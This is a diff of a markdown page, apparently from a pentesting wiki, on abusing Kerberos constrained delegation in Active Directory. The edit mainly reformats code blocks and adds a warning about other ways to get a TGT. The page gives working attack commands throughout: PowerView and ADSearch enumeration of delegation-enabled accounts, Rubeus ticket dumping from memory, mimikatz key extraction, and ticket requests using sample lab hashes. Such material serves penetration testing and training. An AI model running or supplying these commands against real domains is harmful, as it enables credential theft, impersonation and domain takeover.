@@ -31,12 +31,16 @@ Moreover, you **won't only have access to the service that the user is able to i
 
 Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
 
-<pre class="language-bash" data-title="Enumeration"><code class="lang-bash"><strong># Powerview
-</strong><strong>Get-DomainUser -TrustedToAuth
-</strong>Get-DomainComputer -TrustedToAuth
+{% code title="Enumerate" %}
+```bash
+# Powerview
+Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
 
 #ADSearch
-ADSearch.exe --search "(&#x26;(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json</code></pre>
+ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+```
+{% endcode %}
 
 <pre class="language-bash" data-title="Get TGT"><code class="lang-bash"># The first step is to get a TGT of the service taht can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -44,8 +48,8 @@ ADSearch.exe --search "(&#x26;(objectCategory=computer)(msds-allowedtodelegateto
 .\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
 
 # If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
-<strong>## Get AES/RC4 with mimikatz
-</strong>mimikatz sekurlsa::ekeys
+## Get AES/RC4 with mimikatz
+mimikatz sekurlsa::ekeys
 
 ## Request with aes
 <strong>tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
@@ -54,6 +58,12 @@ ADSearch.exe --search "(&#x26;(objectCategory=computer)(msds-allowedtodelegateto
 # Request with RC4
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi</code></pre>
+
+{% hint style="warning" %}
+There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
+
+**Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**
+{% endhint %}
 
 {% code title="Using Rubeus" %}
 ```bash
